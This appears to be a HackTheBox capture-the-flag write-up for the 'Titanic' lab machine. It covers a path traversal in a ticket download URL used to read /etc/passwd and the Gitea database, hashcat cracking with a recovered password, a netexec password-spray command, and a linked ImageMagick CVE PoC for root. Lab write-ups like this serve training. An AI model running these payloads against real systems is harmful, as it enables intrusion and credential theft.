---
layout: post
title: "[HTB] Titanic"
difficulty: Easy
tags: [path_traversal, lfi, hashcat]
status: Complete
---
***

## Quick Hits:

| Info | Details |
| ---- | ------- |
| **IP Address** | 10.10.11.55 |
| **Difficulty** | 🟢 Easy |
| **Exploits** | Path Traversal, Local File Inclusion |
| **Tools Used** | `hashcat` |
| **Techniques Used** |  |
| **Interesting Files** | `~/gitea/data/gitea/conf/app.ini` |

#### Port Scan Results:

| Port | State | Service | Version |
| ---- | ----- | ------- | ------- |
| 22/tcp | open | ssh | OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0) |
| 80/tcp | open | http | Apache httpd 2.4.52 (Ubuntu) |

***

## Walk-through

We are greeted by a Cruise Service named after the infamous **Titanic**. One would usually think twice about any ship that's named after one that sank, but not here! Most of the site still seems to be under construction since most links are *dead*. Fortunately for the Cruise owners (or unfortunately, we'll see why later), the **Booking System** seems to be in order.

Booking a trip has the site respond back with a JSON confirmation of the trip, and a redirect to `/download` the `ticket`. Based on this, the ticket details are being stored in a JSON file in the back-end which is then served up to the browser for download.

### Path Traversal / Local File Inclusion

By simply changing the request from `GET /download?ticket={uuid}.json` to `GET /download?ticket=../../../../etc/passwd`, we can grab files from the local file system. It's here that we can access the `/etc/hosts` file and find the `dev.titanic.htb` domain.

```
127.0.0.1  localhost  titanic.htb  dev.titanic.htb
127.0.1.1  titanic

\# The following lines are desirable for IPv6 capable hosts
::1  ip6-localhost ip6-loopback
fe00::0  ip6-localnet
ff00::0  ip6-mcastprefix
ff02::1  ip6-allnodes
ff02::2  ip6-allroutes
```

### Gitea

Visiting the newly acquired subdomain gives us a Gitea page with the `developer/docker-config` and `developer/flask-app` repos. `flask-app` contains the source of the Cruise website while `docker-config` contains the `docker-compose.yml` file used to start the `Gitea` instance.

We can recreate the `Gitea` docker instance using the `docker-compose.yml` file through the following commands.

`docker compose up -d`
`docker compose exec -it gitea sh`

This allows us to confirm the file structure of the `/home/developer/gitea` directory and obtain `/home/developer/gitea/data/gitea/conf/app.ini` using the LFI vulnerability earlier. This is the Gitea configuration file which contains a `PATH` to the `/data/gitea/gitea.db` file.

```
[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD =
LOG_SQL = false
SCHEMA =
SSL_MODE = disable
```

Again using the LFI vulnerability, we can request this file and obtain the Gitea database. This contains password hashes of `administrator` and `developer` users that we can then run through `gitea2hashcat.py` and crack using the following command:

`sqlite3 gitea.db 'select salt,passwd from user;' | python3 gitea2hashcat.py`
`hashcat hashes.txt /usr/share/wordlists/rockyou.txt`

Giving us the credentials `developer`:`25282528`.

**TIP:** You can use netexec to password spray the usernames if they're not already filled.
`nxc ssh 10.10.11.55 -u users.txt -p '25282528'`

***And, we're in!***

### Privilege Escalation

Running `linpeas.sh` would give us an interesting script in `/opt/scripts/identify_images.sh`.

```
developer@@titanic:/opt/scripts$ cat identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

This seems to run magick on all JPG images within a folder and then pipe those results into a log file.

```
developer@@titanic:/opt/scripts$ ls -al /opt/app/static/assets/images
total 1288
drwxrwx---  2  root  developer  4096  Feb  3  17:13 .
drwxr-x---  2  root  developer  4096  Feb  7  10:37 ..
-rw-r-----  1  root  developer  291864  Feb  3  17:13 entertainment.jpg
-rw-r-----  1  root  developer  280854  Feb  3  17:13 exquisite-dining.jpg
-rw-r-----  1  root  developer  209762  Feb  3  17:13 favicon.ico
-rw-r-----  1  root  developer  232842  Feb  3  17:13 home.jpg
-rw-r-----  1  root  developer  280817  Feb  3  17:13 luxury-cabins.jpg
-rw-r-----  1  root  developer  442  Jun  18  19:09 metadata.log
```

Seeing as `metadata.log` can only be written to by `root` and that changes are made to it every minute, it would be safe to say that `identify_images.sh` runs periodically using the `root` account and is a potential PrivEsc route.

Checking the `magick` version (`/usr/bin/magick -version`) gives us `ImageMagick` version v7.1.1-35, vulnerable to Arbitrary Code Execution in **CVE-2024-41817**.

We can then run the [exploit.py](https://raw.githubusercontent.com/Dxsk/CVE-2024-41817-poc/refs/heads/main/exploit.py) PoC script to obtain `root` access. **And, we're done!**

***

###### This is currently a Work-In-Progress. More changes to formatting, tags and explanations to come!
